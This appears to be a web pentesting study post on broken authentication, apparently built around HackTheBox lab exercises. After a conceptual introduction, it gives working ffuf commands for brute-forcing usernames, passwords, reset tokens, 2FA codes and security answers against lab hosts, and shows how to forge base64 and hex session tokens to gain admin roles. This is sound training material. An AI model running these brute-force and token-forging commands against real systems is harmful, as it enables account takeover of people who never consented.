
---
layout: post
title: "Broken Authentication"
date: 2025-09-27 13:00
categories: [Web Pentesting]
tags: [Brute-Force Attacks, Password Attacks, Authentication Bypasses]

---
# Introduction to Authentication

## Authentication vs. Authorization  
They **always work together**, but never mean the same thing. 
They play **different roles** in securing systems.  
Think of it like a **club entry**:  
- Authentication = Identity → Showing your ID to prove *who you are* .  
- Authorization = Privilege →Decide what you can do once inside.  

---

## 🔹 Comparison Table  

| **Aspect**        | **Authentication**                                | **Authorization**                                   |
|--------------------|---------------------------------------------------|-----------------------------------------------------|
| **Purpose**        | Verifies identity (Are you really who you claim?) | Determines permissions (What are you allowed to do?) |
| **How**            | Uses credentials: password, PIN, biometrics       | Uses policies, roles, privilege levels              |
| **When**           | Always happens first                              | Always follows authentication                       |
| **Data Used**      | Login details (username/password, ID token)       | Privileges, security levels (access token)          |
| **Outcome**        | Identity confirmed or denied                      | Access granted or denied to specific resources      |

---

## 🔹 Real-World Analogy  

1. **Authentication** = Security guard checks your **ID card** at the entrance.  
2. **Authorization** = Guard checks the **list of rooms** you’re allowed to enter.  

- Without authentication → You don’t even get inside the building.  
- Without authorization → You might get in, but you won’t know which rooms you can enter.  

---

## Common Authentication Factors  

| Factor Type | What it Means        | Examples                                       |
| ----------- | -------------------- | ---------------------------------------------- |
| Knowledge   | Something you *know* | Passwords, PINs, OTP , Security Questions      |
| Ownership   | Something you *have* | ID Card, Security Token, Authenticator App     |
| Inherence   | Something you *are*  | Fingerprint, Facial Pattern, Voice recognition |

---

## Single vs Multi-Factor  

- **Single-Factor** = Just one (e.g., Password only )  
- **Multi-Factor (MFA)** = Mix it up (Password + Phone Code )  
- **2FA** = The classic combo of *exactly two* factors  

# Understanding Attacks on Authentication  

Authentication is the first line of defense in security — but each method comes with its own risks.  
Here’s a breakdown of how attackers target the three major authentication factors.  

---

## Knowledge-Based Authentication  
**What it is:** Something you know (passwords, PINs, security questions).  

**Why it’s common:** Simple, cheap, and widely deployed.  

**How attackers exploit it:**  
- Guessing or brute-forcing weak credentials  
- Phishing to trick users into revealing information  
- Data breaches exposing stored passwords  
- Social engineering to obtain personal details  

**Weakness:** Static by nature; once leaked, it’s compromised.  

---

## Ownership-Based Authentication  
**What it is:** Something you have (smart cards, security tokens, mobile authenticator apps).  

**Strengths:** Resistant to phishing and guessing attacks; harder to attack remotely.  

**How attackers exploit it:**  
- Physical theft or loss of devices  
- Cloning or copying items (e.g., NFC badges)  
- Exploiting cryptographic weaknesses in tokens  

**Challenge:** Cost and logistics of managing physical devices at scale.  

---

## Inherence-Based Authentication  
**What it is:** Something you are (fingerprint, facial scan, voice recognition).  

**Strengths:** Seamless user experience, no need to remember or carry anything.  

**How attackers exploit it:**  
- Breaches exposing biometric data (irreversible once stolen)  
- Spoofing with high-quality replicas (e.g., fake fingerprints)  
- Bias or errors in recognition algorithms  

**Case Study (2019):** A biometric smart lock provider was breached, leaking fingerprints, facial scans, passwords, and user addresses. Unlike a password reset, biometric identifiers cannot be replaced once stolen.  

---
# Brute-Force Attacks
## Enumerating Users


https://github.com/danielmiessler/SecLists/tree/master/Usernames


```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

----
## Brute-Forcing Passwords

```bash
wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```
```bash
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```
```bash
wc -l custom_wordlist.txt
```
### `ffuf` command to brute-force the user's password:
```bash
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```
 [Cracking Passwords with Hashcat](https://academy.hackthebox.com/module/details/20) and [Password Attacks](https://academy.hackthebox.com/module/details/147) modules

---
## Brute-Forcing Password Reset Tokens

 ### Identifying Weak Reset Tokens
 ![[Pasted image 20250929053806.png]]
 
 - [ ] 1- Create an account on the target web application
 - [ ] 2- Request a password reset token
 - [ ] 3- analyze it 
---
## Attacking Weak Reset Tokens  
```bash
seq -w 0 9999 > tokens.txt 
```
```bash
head tokens.txt
```
```bash
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

---
# Brute-Forcing 2FA Codes
### Attacking Two-Factor Authentication (2FA)

```bash
seq -w 0 9999 > tokens.txt
```
```shell
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

---
## Weak Brute-Force Protection
- Rate Limits
- CAPTCHAs

---
# Password Attacks
## Testing Default Credentials
 [Testing for Default Credentials](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials)
[CIRT.net](https://www.cirt.net/passwords)
[SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
[SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master) 

---

## Vulnerable Password Reset
  ## Guessable Password Reset Questions
  https://github.com/datasets/world-cities/blob/main/data/world-cities.csv
```shell
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```
```shell
wc -l city_wordlist.txt 
```
```shell
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```
```shell
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```
```shell
wc -l german_cities.txt
```

---
# Authentication Bypasses
## Authentication Bypass via Direct Access
  Applications sometimes issue a `302 Redirect` when a user is not logged in, but still include the protected content in the response body.  
  Browsers follow the redirect, so the user sees the login page, but the sensitive data is still delivered.
  Attackers can intercept or replay responses, ignore the redirect, and directly view confidential data without logging in.

- **How to identify:**  
  - Request a protected endpoint without authentication.  
  - Inspect the raw response body, not just what the browser shows.  
  - If sensitive content is present behind a redirect, the app is vulnerable.  
--------
## Authentication Bypass via Parameter Modification

### What’s the issue?
Some web apps trust **client-supplied parameters** (like `user_id=...` or `is_admin=true`) to decide who you are.  
If you can change those parameters, you may **become another user or even an admin.**
### How to test
1. Look for suspicious params: `user_id`, `role`, `is_admin`.  
2. Compare with vs. without the parameter.  
3. Change values (`0`, `1`, `9999`) and watch the response.  
4. Confirm admin-only content or functions appear.
---
# Session Attacks
## Attacking Session Tokens
### **Identify Weak Tokens**

- **Short tokens** (4 chars) → Brute-force
    
- **Static parts** (`prefix[XXXX]suffix`) → Target random section
    
- **Incrementing** (`141233, 141234`) → Predict next values
    
- **Encoded data** (Base64/Hex) → Decode & manipulate
  
### Base64 Attack
```bash
# Decode captured token
echo "dXNlcj1hZG1pbjtyb2xlPXVzZXI=" | base64 -d
# Output: user=admin;role=user

# Create admin token
echo -n "user=admin;role=administrator" | base64
# Output: dXNlcj1hZG1pbjtyb2xlPWFkbWluaXN0cmF0b3I=
```

### Hex Attack
```bash
# Decode hex token
echo "757365723d61646d696e3b726f6c653d75736572" | xxd -r -p
# Output: user=admin;role=user

# Create superuser token
echo -n "user=admin;role=superuser" | xxd -p
# Output: 757365723d61646d696e3b726f6c653d737570657275736572
```

---

